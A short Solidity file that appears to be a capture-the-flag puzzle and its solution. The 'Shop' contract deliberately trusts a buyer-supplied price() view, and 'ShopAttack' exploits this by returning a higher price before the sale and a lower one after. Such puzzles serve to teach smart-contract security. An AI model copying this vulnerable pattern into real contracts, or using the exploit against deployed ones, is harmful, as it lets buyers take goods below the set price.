// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint);
}

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract ShopAttack is Buyer {
    Shop private p_shop;

    constructor(Shop _shop) {
        p_shop = _shop;
    }

    function buy() public {
        p_shop.buy();
    }

    function price() external view override returns (uint) {
        return p_shop.isSold() ? 1 : 101;
    }
}
